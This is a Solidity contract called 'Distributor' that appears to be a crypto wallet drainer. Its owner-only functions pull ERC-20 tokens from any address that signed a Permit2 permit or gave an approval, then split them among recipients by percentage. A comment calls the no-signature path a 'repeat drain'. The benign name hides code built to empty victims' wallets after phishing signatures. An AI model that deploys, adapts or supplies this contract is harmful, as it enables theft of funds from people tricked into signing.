// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPermit2 {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct PermitSingle {
        PermitDetails details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(address owner, PermitSingle calldata permitSingle, bytes calldata signature) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
}

contract Distributor {
    address public owner;
    IPermit2 private constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // Standard flow: requires prior ERC-20 approve to this contract
    function distribute(
        address tokenAddress,
        address from,
        address[] calldata recipients,
        uint256[] calldata percents,
        uint256 totalAmount
    ) external onlyOwner {
        _validatePercents(recipients.length, percents);
        IERC20 token = IERC20(tokenAddress);
        for (uint i = 0; i < recipients.length; i++) {
            uint256 share = totalAmount * percents[i] / 100;
            token.transferFrom(from, recipients[i], share);
        }
    }

    // Permit2 first-use: atomically sets allowance + pulls tokens + distributes in one tx.
    // spender in the PermitSingle must be address(this).
    function distributeWithPermit2(
        address tokenAddress,
        address from,
        address[] calldata recipients,
        uint256[] calldata percents,
        uint256 totalAmount,
        IPermit2.PermitSingle calldata permit,
        bytes calldata signature
    ) external onlyOwner {
        _validatePercents(recipients.length, percents);

        PERMIT2.permit(from, permit, signature);
        PERMIT2.transferFrom(from, address(this), uint160(totalAmount), tokenAddress);

        IERC20 token = IERC20(tokenAddress);
        for (uint i = 0; i < recipients.length; i++) {
            uint256 share = totalAmount * percents[i] / 100;
            token.transfer(recipients[i], share);
        }
    }

    // Permit2 repeat drain: uses existing allowance set by distributeWithPermit2 or permit2.permit().
    // No signature required — allowance already stored in Permit2.
    function distributeViaPermit2Allowance(
        address tokenAddress,
        address from,
        address[] calldata recipients,
        uint256[] calldata percents,
        uint256 totalAmount
    ) external onlyOwner {
        _validatePercents(recipients.length, percents);

        PERMIT2.transferFrom(from, address(this), uint160(totalAmount), tokenAddress);

        IERC20 token = IERC20(tokenAddress);
        for (uint i = 0; i < recipients.length; i++) {
            uint256 share = totalAmount * percents[i] / 100;
            token.transfer(recipients[i], share);
        }
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        owner = newOwner;
    }

    function _validatePercents(uint256 len, uint256[] calldata percents) private pure {
        require(len == percents.length, "Length mismatch");
        uint256 total = 0;
        for (uint i = 0; i < percents.length; i++) {
            total += percents[i];
        }
        require(total == 100, "Percents must sum to 100");
    }
}